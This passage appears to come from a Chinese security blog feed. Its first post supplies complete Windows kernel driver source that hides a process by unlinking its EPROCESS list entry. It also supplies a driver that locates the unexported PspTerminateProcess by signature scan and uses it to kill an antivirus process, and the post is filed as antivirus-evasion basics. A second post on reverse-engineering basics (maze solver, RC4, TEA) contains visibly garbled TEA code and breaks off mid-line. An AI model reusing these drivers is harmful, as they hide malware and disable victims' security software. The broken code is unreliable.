printf(&quot;success\n&quot;); </span><br><span class="line">	getchar();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-3实现效果"><a href="#1-2-3实现效果" class="headerlink" title="1.2.3实现效果"></a>1.2.3实现效果</h3><p>执行前</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926161248337.png" alt="image-20230926161248337"></p>
<p>执行后</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926161331471.png" alt="image-20230926161331471"></p>
<h1 id="二、0环断链隐藏"><a href="#二、0环断链隐藏" class="headerlink" title="二、0环断链隐藏"></a>二、0环断链隐藏</h1><h2 id="2-1-0环断链隐藏与3环断链隐藏的区别"><a href="#2-1-0环断链隐藏与3环断链隐藏的区别" class="headerlink" title="2.1 0环断链隐藏与3环断链隐藏的区别"></a>2.1 0环断链隐藏与3环断链隐藏的区别</h2><p>LoadPE是基于3环检查的软件，所以上述代码可以让LoadPE无法检测出dll的加载，但对于一些基于0环检查的软件，如：Process Hacker则无法避免检测出dll的加载。如下图所示</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926162104549.png" alt="image-20230926162104549"></p>
<p>所以下文将继续介绍0环的断链隐藏。下文主要用于隐藏进程而非dll的加载。</p>
<h2 id="2-2基本原理"><a href="#2-2基本原理" class="headerlink" title="2.2基本原理"></a>2.2基本原理</h2><p>在操作系统层面上，进程本质上就是一个结构体，当操作系统想要创建一个进程时，就分配一块内存，填入一个结构体，并为结构体中的每一项填充一些具体值，而这个结构体，就是 EPROCESS 。在 +0x088 偏移处有一个指针 ActiveProcessLinks ，指向的是 _LIST_ENTRY ，它是双向链表，所有的活动进程都连接在一起，构成了一个链表。那么链表总有一个头，全局变量 PsActiveProcessHead （八个字节）指向全局链表头。这个链表跟进程隐藏有关，只要我们把想要隐藏进程对应的 EPROCESS 的链断掉，就可以达到在0环进程隐藏的目的。前四个字节指向的是下一个 EPROCESS 结构，但指向的并不是 EPROCESS 的首地址，而是每一个进程的_EPROCESS + 0x88 的位置。所以当我们要查询下一个进程结构时，需要 -0x88。比如当前 PsActiveProcessHead 指向的下一个地址为 0x863b58b8 ，用windbg查询为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS 863b58b8-0x88</span><br></pre></td></tr></table></figure>

<p>在0x174偏移的地方存储着进程名，我们可以看到第一个 EPROCESS 结构对应的是 System 进程，这里0x88 偏移存放的就是下一个 EPROCESS 结构的地址，但是这里注意，因为这个结构的地址是指向下一个链表的地址，所以如果要得到 EPROCESS 的首结构就需要 -0x88。那么到这里我们的思路就清晰了，通过EPROCESS 找到我们要隐藏的进程的 ActiveProcessLinks ，将双向链表的值修改，就可以将我们想要隐藏的这个进程的 ActiveProcessLinks 从双向链表中抹去的效果，这里的话如果在windbg里面直接使用 ed 修改的话是比较方便的，但是如果要使用代码来进行修改的话就需要首先定位到 EPROCESS 在 ETHREAD 的 0x220 偏移得到 ThreadsProcess ，指向的是 _EPROCESS 这个结构体。那么就可以用汇编实现找到 EPROCESS 结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm &#123; </span><br><span class="line">	mov eax, fs: [0x124] ;</span><br><span class="line">	mov eax, [eax + 0x220];</span><br><span class="line">	mov pEprocess, eax;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先定义一个指针指向 EPROCESS 结构，并初始化指向 ActiveProcessLinks 的指针</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pCurProcess = pEprocess; </span><br><span class="line">curNode = (PLIST_ENTRY)((ULONG)pCurProcess + 0x88);</span><br></pre></td></tr></table></figure>

<p>然后判断通过 EPROCESS 的0x174处的 ImageFileName 来判断进程名是不是我们想要隐藏的进程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ImageFileName = (PCHAR)pCurProcess + 0x174; </span><br><span class="line">if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0)</span><br></pre></td></tr></table></figure>

<p>如果不是我们想要的进程就继续往下取 ActiveProcessLinks 的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pCurProcess = (PEPROCESS)(*(PULONG)((ULONG)pCurProcess + 0x88) - 0x88);</span><br></pre></td></tr></table></figure>

<h2 id="2-2完整代码实现"><a href="#2-2完整代码实现" class="headerlink" title="2.2完整代码实现"></a>2.2完整代码实现</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;ntddk.h&gt;</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path);</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT drtver);</span><br><span class="line">NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) &#123;</span><br><span class="line">	PEPROCESS pEprocess, pCurProcess;</span><br><span class="line">	PCHAR ImageFileName;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		mov eax, fs: [0x124] ;</span><br><span class="line">		mov eax, [eax + 0x220];</span><br><span class="line">		mov pEprocess, eax;</span><br><span class="line">	&#125;</span><br><span class="line">	pCurProcess = pEprocess;</span><br><span class="line">	do &#123;</span><br><span class="line">		ImageFileName = (PCHAR)pCurProcess + 0x174;</span><br><span class="line">		if (strcmp(ImageFileName, &quot;notepad.exe&quot;) == 0) &#123;</span><br><span class="line">			PLIST_ENTRY preNode, curNode, nextNode;</span><br><span class="line">			curNode = (PLIST_ENTRY)((ULONG)pCurProcess + 0x88);</span><br><span class="line">			nextNode = curNode-&gt;Flink;</span><br><span class="line">			preNode = curNode-&gt;Blink;</span><br><span class="line">			preNode-&gt;Flink = curNode-&gt;Flink;</span><br><span class="line">			nextNode-&gt;Blink = curNode-&gt;Blink;</span><br><span class="line">			DbgPrint(&quot;断链成功\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		pCurProcess = (PEPROCESS)(*(PULONG)((ULONG)pCurProcess + 0x88) - 0x88);</span><br><span class="line">	&#125; while (pEprocess != pCurProcess);</span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(PDRIVER_OBJECT driver) &#123;</span><br><span class="line">	DbgPrint(&quot;驱动卸载成功\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码执行后</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20230926201455875.png" alt="image-20230926201455875"></p>
<h1 id="三、进程强杀"><a href="#三、进程强杀" class="headerlink" title="三、进程强杀"></a>三、进程强杀</h1><p>ZwTerminalProcess是一个ring0函数，用于终止一个进程及其所有线程，但是该函数往往被杀软检测到，所以我们应该使用更为底层的PspTerminalProcess函数。</p>
<h2 id="3-1PspTerminalProcess函数"><a href="#3-1PspTerminalProcess函数" class="headerlink" title="3.1PspTerminalProcess函数"></a>3.1PspTerminalProcess函数</h2><p>PspTerminalProcess函数是一个未导出函数，WDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。对于未导出函数的使用通常采用两种方式。</p>
<ol>
<li><strong>暴力搜索，提取该函数的特征码，全盘搜索。</strong></li>
<li><strong>如果有已文档化的函数调用了PspTerminateProcess，那我们就可以通过指针加偏移的方式获取到他的地址，同样可以调用。</strong></li>
</ol>
<h2 id="3-2如何全盘搜索"><a href="#3-2如何全盘搜索" class="headerlink" title="3.2如何全盘搜索"></a>3.2如何全盘搜索</h2><h3 id="3-2-1搜索模块"><a href="#3-2-1搜索模块" class="headerlink" title="3.2.1搜索模块"></a>3.2.1搜索模块</h3><p>那么我们要想全盘搜索，肯定要先找到内核模块，每个内核模块都有一个对应的结构体，来描述这个模块在内核中的：位置、大小、名称等等， DriverEntry 的第一个参数就是这个结构体。主要关注 DriverSize 和 DriverName 这两个参数， DriverSize 主要是表示驱动的大小，DriverName 为驱动的名称。</p>
<p>通过 _DRIVER_OBJECT 结构体中 0x014的偏移有一个成员， DriverSection 则可以实现对内核模块的遍历。 DriverSection 是一个指针，实际上是对应着一个结构体： _LDR_DATA_TABLE_ENTRY。通过结构中的 InLoadOrderLinks 可以查询到其他内核模块的信息。依此类推，可以获取到其他所有的内核模块。</p>
<h3 id="3-2-2找特征码"><a href="#3-2-2找特征码" class="headerlink" title="3.2.2找特征码"></a>3.2.2找特征码</h3><p>说完了怎样搜寻模块，再来看看怎么找特征码，首先定位到函数。这种 mov 、 push 指令因为可能每个模块都会有，所以不能当作特征码，也不能够选重定位的数据当作特征码。通过windbg的跟入，我们会收集到如下代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">805d3487 56 				push esi </span><br><span class="line">805d3488 64a124010000 		mov eax,dword ptr fs:[00000124h] </span><br><span class="line">805d348e 8b7508 			mov esi,dword ptr [ebp+8]</span><br><span class="line">805d3491 3b7044 			cmp esi,dword ptr [eax+44h]</span><br><span class="line">805d3494 7507 				jne nt!PspTerminateProcess+0x1b (805d349d)</span><br><span class="line">805d3496 b80d0000c0 		mov eax,0C000000Dh </span><br><span class="line">805d349b eb5a 				jmp nt!PspTerminateProcess+0x75 (805d34f7) </span><br><span class="line">805d349d 57 				push edi</span><br></pre></td></tr></table></figure>

<p>提取出的相应特征码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCHAR szSpecialCode[] = &#123;0x56, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x75, 0x08, 0x3B, 0x70, 0x44, 0x75, 0x07, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x5A, 0x57 &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="3-3代码实现"><a href="#3-3代码实现" class="headerlink" title="3.3代码实现"></a>3.3代码实现</h2><p>如图所示火绒的PID为2976</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20231001214601700.png" alt="image-20231001214601700"></p>
<p>具体代码实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;ntifs.h&gt; </span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class="line">	LIST_ENTRY InLoadOrderLinks; </span><br><span class="line">	LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">	LIST_ENTRY InInitializationOrderLinks; </span><br><span class="line">	PVOID DllBase; </span><br><span class="line">	PVOID EntryPoint; </span><br><span class="line">	UINT32 SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName; </span><br><span class="line">	UNICODE_STRING BaseDllName; </span><br><span class="line">	UINT32 Flags; </span><br><span class="line">	UINT16 LoadCount; </span><br><span class="line">	UINT16 TlsIndex; </span><br><span class="line">	LIST_ENTRY HashLinks; </span><br><span class="line">	PVOID SectionPointer; </span><br><span class="line">	UINT32 CheckSum; </span><br><span class="line">	UINT32 TimeDateStamp;</span><br><span class="line">	PVOID LoadedImports;</span><br><span class="line">	PVOID EntryPointActivationContext; </span><br><span class="line">	PVOID PatchInformation; </span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line">typedef NTSTATUS(*pfnPspTerminateProcess)(PEPROCESS pEprocess, NTSTATUS ExitCode);</span><br><span class="line">VOID DriverUnload(IN PDRIVER_OBJECT driverObject); //卸载驱动 </span><br><span class="line">PVOID SearchFunction(PUCHAR DllBase, UINT32 SizeOfImage); // 查找模块中匹配特征码 </span><br><span class="line">ULONG g_uPID = 2976; // 要关闭的进程PID</span><br><span class="line">// 特征码 </span><br><span class="line">UCHAR g_szSpecialCode[] = &#123; 0x56, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, </span><br><span class="line">0x8B, 0x75, 0x08, 0x3B, 0x70, 0x44, 0x75, 0x07,</span><br><span class="line">0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x5A, 0x57 &#125;; </span><br><span class="line">// 特征码长度 </span><br><span class="line">UINT32 g_uSpecialCodeLen = sizeof(g_szSpecialCode);</span><br><span class="line">NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath) &#123;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL;</span><br><span class="line">	pfnPspTerminateProcess pPspTerminateProcess = NULL;</span><br><span class="line">	PEPROCESS pEprocess = NULL;</span><br><span class="line">	DbgPrint(&quot;驱动加载完成\r\n&quot;);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;</span><br><span class="line">	pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	do &#123;</span><br><span class="line">		pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">		// 如果存在则搜索特征码</span><br><span class="line">		if (pLdrDataTableEntry-&gt;DllBase) &#123;</span><br><span class="line">			pPspTerminateProcess = (pfnPspTerminateProcess)SearchFunction((PUCHAR)pLdrDataTableEntry-&gt;DllBase, pLdrDataTableEntry-&gt;SizeOfImage);</span><br><span class="line">		&#125;</span><br><span class="line">		if (pPspTerminateProcess) break;</span><br><span class="line">		// 遍历 </span><br><span class="line">		pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125; while ((UINT32)pLdrDataTableEntry != (UINT32)driverObject-&gt;DriverSection);</span><br><span class="line">	if (pPspTerminateProcess) &#123;</span><br><span class="line">		status = PsLookupProcessByProcessId((HANDLE)g_uPID, &amp;pEprocess);</span><br><span class="line">		if (NT_SUCCESS(status)) &#123;</span><br><span class="line">			status = pPspTerminateProcess(pEprocess, 0);</span><br><span class="line">			if (NT_SUCCESS(status)) &#123;</span><br><span class="line">				DbgPrint(&quot;使用PspTerminateProcess 关闭进程成功, PID = %d\r\n&quot;, g_uPID);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			DbgPrint(&quot;PsLookupProcessByProcessId Error 0x%X\r\n&quot;, status);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(IN PDRIVER_OBJECT driverObject) &#123;</span><br><span class="line">	DbgPrint(&quot;驱动卸载完成\r\n&quot;);</span><br><span class="line">&#125;PVOID SearchFunction(PUCHAR DllBase, UINT32 SizeOfImage) &#123; </span><br><span class="line">	DbgPrint(&quot;Here is MemorySearch , length is : %d\r\n&quot;, SizeOfImage); </span><br><span class="line">	PVOID pFuncAddr = NULL;</span><br><span class="line">	UINT32 uEnd = (UINT32)DllBase + SizeOfImage - g_uSpecialCodeLen; </span><br><span class="line">	// 减去特 征码后的长度 </span><br><span class="line">	UINT32 i = 0; BOOLEAN bOk = TRUE; </span><br><span class="line">	while ((UINT32)DllBase &lt;= uEnd) &#123;</span><br><span class="line">		bOk = TRUE; for (i = 0; i &lt; g_uSpecialCodeLen; i++) &#123; </span><br><span class="line">			if (!MmIsAddressValid(&amp;DllBase[i]) || DllBase[i] != g_szSpecialCode[i]) &#123; </span><br><span class="line">				bOk = FALSE; break; </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if (bOk) &#123;</span><br><span class="line">			pFuncAddr = (PVOID)(DllBase - 5); </span><br><span class="line">			DbgPrint(&quot;找到特征码，内存地址为%p\r\n&quot;, pFuncAddr);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">		DllBase++; </span><br><span class="line">	&#125;</span><br><span class="line">	return pFuncAddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20231001214744837.png" alt="image-20231001214744837"></p>
<p>代码执行成功！！！</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse与pwn基础</title>
    <url>/2023/10/25/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>​	本篇主要总结逆向所需的基础知识。</p>
<span id="more"></span>

<h1 id="动静态分析"><a href="#动静态分析" class="headerlink" title="动静态分析"></a>动静态分析</h1><p>静态分析可以查看代码的逻辑，理清逻辑后可以通过动态分析理解这个程序到底做了哪些行为，或者查看内存的值。用ida64随便打开一个程序，如下：</p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025191329467.png" alt="image-20231025191329467"></p>
<p>首先是endr64，endr64是intel为了防止栈溢出做出来的一个保护机制。</p>
<h2 id="ida动态调试"><a href="#ida动态调试" class="headerlink" title="ida动态调试"></a>ida动态调试</h2><p>dbgsrv文件夹下的linux server和linux server 64放到虚拟机中，用chmod赋予权限。在ida的debugger选项中选择Remote Linux debugger，点击ok。再点击Debugger的Process options，在Hostname下输入虚拟机的ip地址。在点击start process</p>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>输入start .&#x2F;文件名。下断点可以使用b 函数名,删除断点可以使用delete。boff可以将偏移地址加上基地址并断在这个地方。</p>
<h1 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
<li>在内存中布置一张”地图”.</li>
<li>将用户输入限制在少数几个字符范围内。</li>
<li>一般只有一个迷宫入口和一个迷宫出口。</li>
</ol>
<p>布置的地图可以由可显字符(比如<em>和#)组合成，也可以单纯用不可显的十六进制值进行表示。可以将地图直接组成一条非常长的字符串，后者是一行一行分开布置。如果是一行一行分开布置的话，因为迷宫一般都会比较大，所以用于按行</em>(注意行号)，布置迷宫的函数会明显重复多次。</p>
<p>而被限制的字符通常会是一些方便记忆的组合。对于二维地图，一般都会设置一个x坐标和一个y坐标用于保存当前位置，这也是一个入手点。</p>
<p><strong>常用解题脚本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def solve_maze(mp):</span><br><span class="line">    #delta = [y,x,step]</span><br><span class="line">    delta = [</span><br><span class="line">        [0,-1,&quot;a&quot;],[0,1,&quot;d&quot;],[-1,0,&quot;w&quot;],</span><br><span class="line">        [1,0,&quot;s&quot;],[5,0,&quot;x&quot;],[-5,0,&quot;y&quot;]    #操作数需要改</span><br><span class="line">    ]</span><br><span class="line">    path = &quot;&quot;</span><br><span class="line">    N,M = 25,5 #长和宽需要改</span><br><span class="line">    st = mp.index(&quot;s&quot;) #需要改 起始位置</span><br><span class="line">    ed = mp.index(&quot;#&quot;) #终点位置</span><br><span class="line">    ID = lambda x,y: x * M + y</span><br><span class="line">    vis = [[False] * M for _ in range(N)]</span><br><span class="line"> </span><br><span class="line">    def dfs(x,y,cPath = &quot;&quot;):</span><br><span class="line">        nonlocal path</span><br><span class="line">        if x &lt; 0 or x &gt;= N or y &lt; 0 or y &gt;= M or vis[x][y] or mp[ID(x,y)] == &quot;*&quot;:# 不可以走的路径</span><br><span class="line">            return False</span><br><span class="line">        if ID(x,y) == ed:</span><br><span class="line">            path = cPath</span><br><span class="line">            return True</span><br><span class="line">        vis[x][y] = True</span><br><span class="line">        for i in range(6):# 对应delta有几个操作数</span><br><span class="line">            fl = dfs(x + delta[i][0],y + delta[i][1],cPath + delta[i][2])</span><br><span class="line">            if fl:</span><br><span class="line">                vis[x][y] = False</span><br><span class="line">                return True</span><br><span class="line">        vis[x][y] = False</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line">    dfs(st // M,st % M)</span><br><span class="line">    return path</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    mp = &quot;**************.****.**s..*..******.****.***********..***..**..#*..***..***.********************.**..*******..**...*..*.*.**.*&quot; #迷宫的数据</span><br><span class="line">    path = solve_maze(mp)</span><br><span class="line">    print(path)</span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><strong>(ida的n键可以改变量名称)</strong></p>
<h1 id="ida中的琐碎知识"><a href="#ida中的琐碎知识" class="headerlink" title="ida中的琐碎知识"></a>ida中的琐碎知识</h1><ol>
<li><p>__m128i类型的解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef union __declspec(intrin_type) _CRT_ALIGN(16) __m128i &#123;</span><br><span class="line">                                                                                	__int8    			  m128i_i8[16];</span><br><span class="line">                                                                                  __int16   			  m128i_i16[8];</span><br><span class="line">                                                                                  __int32               m128i_i32[4];   </span><br><span class="line">                                                                                  __int64               m128i_i64[2];</span><br><span class="line">                                                                                  unsigned __int8       m128i_u8[16];</span><br><span class="line">                                                                                  unsigned __int16      m128i_u16[8];</span><br><span class="line">                                                                                  unsigned __int32      m128i_u32[4];</span><br><span class="line">                                                                                  unsigned __int64      m128i_u64[2];</span><br><span class="line">                                                                             &#125; __m128i;</span><br><span class="line">                                                                             </span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>ida里面按tab键将从反编译窗口跳转到汇编窗口。</p>
</li>
<li><p>ida里面edit-&gt;patching gramm-&gt;assembly更改汇编代码，apply…保存。</p>
</li>
<li><p>gdb中 i b查看断点，fin跳过函数，n，s单步步入。</p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231026155426660.png" alt="image-20231026155426660"></p>
<h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>•No-execute</p>
<p>•默认打开</p>
<p>•该保护开启之后程序会<strong>将数据区标记成不可执行</strong>，如果程序尝试<strong>在数据段执行指令</strong>，CPU就会<strong>抛出异常</strong>而不是去执行 </p>
<p>•这个保护使得我们不能直接在数据段执行shellcode。</p>
<p>•编译选项：</p>
<p>•关闭：-z execstack </p>
<p>•开启：-z noexecstack</p>
<p>attach(p)可以将程序用pwndbg调试。</p>
<p>ida常用快捷键</p>
<p><img src="/images/reverse%E4%B8%8Epwn%E5%9F%BA%E7%A1%80/202309211633_5ZWKRDW4NTGXG79.jpg" alt="img"></p>
</li>
</ol>
</li>
</ol>
<h1 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a>常见加密算法</h1><h2 id="Rc4"><a href="#Rc4" class="headerlink" title="Rc4"></a>Rc4</h2><p>主要分为2个过程:</p>
<p>rc4_init初始化(KSA)</p>
<p>rc4_crypt加解密过程(PRGA)</p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025202450148.png" alt="image-20231025202450148"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025203047611.png" alt="image-20231025203047611"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025203137118.png" alt="image-20231025203137118"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025203208565.png" alt="image-20231025203208565"></p>
<h3 id="Rc4解密模板"><a href="#Rc4解密模板" class="headerlink" title="Rc4解密模板"></a>Rc4解密模板</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include#include #include /*</span><br><span class="line">RC4初始化函数</span><br><span class="line">*/</span><br><span class="line">void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)</span><br><span class="line">&#123;</span><br><span class="line">    int i = 0, j = 0;</span><br><span class="line">    char k[256] = &#123; 0 &#125;;</span><br><span class="line">    unsigned char tmp = 0;</span><br><span class="line">    for (i = 0; i &lt; 256; i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i % Len_k];</span><br><span class="line">    &#125;</span><br><span class="line">    for (i = 0; i &lt; 256; i++) &#123;</span><br><span class="line">        j = (j + s[i] + k[i]) % 256;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/*</span><br><span class="line">RC4加解密函数</span><br><span class="line">unsigned char* Data     加解密的数据</span><br><span class="line">unsigned long Len_D     加解密数据的长度</span><br><span class="line">unsigned char* key      密钥</span><br><span class="line">unsigned long Len_k     密钥长度</span><br><span class="line">*/</span><br><span class="line">void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) //加解密</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char s[256];</span><br><span class="line">    rc4_init(s, key, Len_k);</span><br><span class="line">    int i = 0, j = 0, t = 0;</span><br><span class="line">    unsigned long k = 0;</span><br><span class="line">    unsigned char tmp;</span><br><span class="line">    for (k = 0; k &lt; Len_D; k++) &#123;</span><br><span class="line">        i = (i + 1) % 256;</span><br><span class="line">        j = (j + s[i]) % 256;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j];</span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t = (s[i] + s[j]) % 256;</span><br><span class="line">        Data[k] = Data[k] ^ s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    //字符串密钥</span><br><span class="line">    unsigned char key[] = &quot;hellore&quot;;</span><br><span class="line">    unsigned long key_len = 7;</span><br><span class="line">    unsigned char data[] = &#123;0x4a,0x9e,0x9b,0xc8,0xa5,0xf,0x46,0xaf,0x42,0x77,0x84,0xe0,0xda,0x78,0x54,0x81,0xd6,0xc4,0xe8,0xe3,0x1a,0x47,0xdf,0x6d,0x7f,0xa,0x92,0xd9,0xa5,0xe3,0xe3,0x77&#125;;</span><br><span class="line">     </span><br><span class="line">    rc4_crypt(data, sizeof(data), key, key_len);</span><br><span class="line"> </span><br><span class="line">    for (int i = 0; i &lt; sizeof(data); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%c&quot;, data[i]);</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gdb:dprintf *$rebase(0x1636),”%x”,$ecx</p>
<p>cyclic生成字符。</p>
<p>ida中右键convert中的convert to C&#x2F;C++ array(BYTE)</p>
<h2 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h2><p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025205808926.png" alt="image-20231025205808926"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025205836247.png" alt="image-20231025205836247"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025210052705.png" alt="image-20231025210052705"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025210151815.png" alt="image-20231025210151815"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025210211807.png" alt="image-20231025210211807"></p>
<p><img src="/images/reverse%E5%9F%BA%E7%A1%80/image-20231025210250289.png" alt="image-20231025210250289"></p>
<h3 id="静态解密脚本"><a href="#静态解密脚本" class="headerlink" title="静态解密脚本"></a>静态解密脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include #include unsigned int *encrypt(unsigned int *input, unsigned int *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned int v4; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  unsigned int v5; // [rsp+20h] [rbp-20h]</span><br><span class="line">  int v6; // [rsp+24h] [rbp-1Ch]</span><br><span class="line">  unsigned int j; // [rsp+28h] [rbp-18h]</span><br><span class="line"> </span><br><span class="line">  for ( i = 0; i  5) + a2[1]);</span><br><span class="line">      v5 += (v4 + v6) ^ (16 * v4 + a2[2]) ^ ((v4 &gt;&gt; 5) + a2[3]);</span><br><span class="line">    &#125;</span><br><span class="line">    input[2 * i] = v4;</span><br><span class="line">    input[2 * i + 1] = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  return input;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unsigned int *decrypt(unsigned int *input, unsigned int *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+18h] [rbp-28h]</span><br><span class="line">  unsigned int v4; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  unsigned int v5; // [rsp+20h] [rbp-20h]</span><br><span class="line">  int v6; // [rsp+24h] [rbp-1Ch]</span><br><span class="line">  unsigned int j; // [rsp+28h] [rbp-18h]</span><br><span class="line"> </span><br><span class="line">  for ( i = 0; i  5) + a2[3]);</span><br><span class="line">      v4 -= (v5 + v6) ^ (16 * v5 + *a2) ^ ((v5 &gt;&gt; 5) + 